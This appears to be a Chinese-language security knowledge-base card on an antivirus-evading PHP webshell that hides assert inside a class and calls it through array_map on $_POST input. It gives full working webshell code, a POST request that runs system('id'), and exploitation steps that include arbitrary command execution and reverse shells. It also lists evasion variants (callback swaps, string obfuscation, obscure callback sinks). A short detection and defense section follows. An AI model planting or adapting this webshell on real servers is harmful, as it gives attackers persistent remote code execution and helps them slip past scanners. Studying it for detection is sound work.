---
id: web-php-rce-class-array-map-assert-webshell
title: PHP 免杀 WebShell：类封装 + array_map(assert, $_POST) 回调执行
type: scenario
domain: web
path: web/php/rce
technique: php-class-array-map-assert-webshell
tags:
- php
- webshell
- rce
- assert
- array_map
- callback
- av-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V311
  verified_at: '2026-11-08T13:25:14+08:00'
  notes: 已对照图16 func.php 代码核对并修正两处：①原卡误写 _construct 并称『非魔术方法、需显式调用』，放大原图确认实际为 __construct，new Sn0w(assert, array($_POST[...])) 时自动赋值，已改正正文与 PoC；②D盾图判 func.php 为级别 5『已知后门』，原卡写级别 4 Eval后门，已改正（级别 4 的是同目录 1.php/god.php）。array_map(assert, $_POST 数组) 结构、POST 参数名为 Base64 串、PHP 8 移除字符串 assert / zend.assertions 边界均成立。未实际执行样本。
url: /docs/web/php/rce/web-php-rce-class-array-map-assert-webshell/
draft: false
kb_aliases:
- array_map assert 马
- 类封装免杀 webshell
- assert 回调执行 POST
- Sn0w 免杀马
- 无 eval 关键字 webshell
---

## 一句话结论

把 `assert` 与 `array($_POST[...])` 作为参数传入对象，在方法里用 `array_map($this->a, $this->b)` 调用，请求时 POST 的值就会被 `assert` 当作 PHP 代码执行；文件里没有常见的 `eval($_POST[...])` 形态，D盾将其识别为「已知后门」（本题 func.php 级别 5；同目录 1.php/god.php 才是级别 4 的 Eval 后门）。该类封装与回调间接调用可绕过只匹配 `eval`/`assert($_POST)` 固定结构的静态规则；但 `assert` 字符串求值在 PHP 8 起被移除，且受 `zend.assertions` 配置影响。

## 原理

- `array_map(callback, array)` 对数组的每个元素调用 callback；当 callback 是 `assert` 时，若元素是字符串，PHP 5/7 的 `assert()` 会把它作为 PHP 代码求值（前提是 `zend.assertions=1` 且 assert 未被禁用）。
- 类封装把 callback 与参数藏到属性：魔术构造函数 `__construct($a, $b)` 在 `new Sn0w(assert, array($_POST[...]))` 时自动保存 `$this->a = assert`、`$this->b = array($_POST[...])`；`test()` 只调用 `array_map($this->a, $this->b)`。
- 静态扫描看到的是对象属性与 `array_map`，没有 `eval($_POST)`；简单的关键字/正则规则可能只报低级别或漏报，D盾这类语法型引擎仍能识别为后门。
- POST 参数名可以任意构造（本题参数名本身是一段 Base64 字符串），真正的代码在参数值里；攻击者只需控制值。
- 版本边界：PHP 8.0 起 `assert()` 不再执行字符串代码；生产环境 `zend.assertions=0/-1` 时字符串 assert 也不执行，因此该 webshell 主要影响 PHP 5.x/7.x 且断言开启的环境。

## 触发条件

- 目标为 PHP 5.x/7.x，`zend.assertions=1`（开发/默认配置），`assert` 未被 `disable_functions` 禁用。
- 恶意文件已落地且可通过 Web 访问（上传、写入、包含等）。
- 攻击者能向目标 POST 参数提交 PHP 代码。
- 静态防护以关键字匹配为主，未识别回调型 assert。

## 利用步骤

1. 落地 webshell 文件（如通过上传/写入漏洞），内容为类封装 + `array_map(assert, ...)`。
2. 读取源码确认 POST 参数名与执行路径。
3. 向该文件 POST 参数值 `system('id');`（或 `phpinfo();`）验证执行。
4. 成功后执行任意命令、读写文件、反弹 shell；必要时再写更稳定的 webshell。
5. 注意目标 PHP 版本与 `zend.assertions`；若 assert 不可用，改用 `array_map('system', ...)` 或 `call_user_func` 等回调 sink。

## PoC

```php
<?php
class Sn0w {
    var $a;
    var $b;
    function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }
    function test() {
        array_map($this->a, $this->b);
    }
}
$p1 = new Sn0w(assert, array($_POST['<param>']));
$p1->test();
```

```http
POST /controller/func.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

<param>=system('id');
```

## 变体与关联

- **回调替换**：`array_map('system', array($_POST['cmd']))`、`call_user_func('assert', ...)`、`array_filter`/`usort` 等接受 callback 的函数；`assert` 被禁用时改用 `system`/`passthru`/`shell_exec`。
- **字符串混淆**：把 `assert`、`array_map`、`_POST` 按位取反或拆分拼接，可进一步规避静态规则；见 [[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]。
- **冷门回调 sink**：`array_uintersect_uassoc` 等函数把比较器参数直接当回调，可让文件里不出现 `eval`/`assert`/`array_map` 关键字。
- **PHP 8 失效**：PHP 8 移除了字符串 assert 求值，需改用其他 sink；排查时应确认版本与 `zend.assertions`。
- 关联：[[defense-incident-response-web-root-dshield-webshell-hidden-base64]]（D盾发现该文件的现场）。

## 检测与防御

- **静态检测**：YARA/规则覆盖 `array_map`、`call_user_func`、`array_filter`、`usort` 等回调函数与 `assert` 的组合；不要只匹配 `eval($_POST`。
- **配置**：生产环境设置 `zend.assertions=-1`（或 0）并禁用 `assert`；升级到 PHP 8+ 可消除字符串 assert 求值。
- **运行时**：禁用 `disable_functions` 中的危险函数（可被绕过，需配合其他措施）；限制 Web 目录写入与 PHP 执行；监控 Web 进程派生的 `sh`/`system` 子进程。
- **响应**：发现此类文件后按 webshell 处置流程隔离样本、排查写入入口与同目录其他文件。
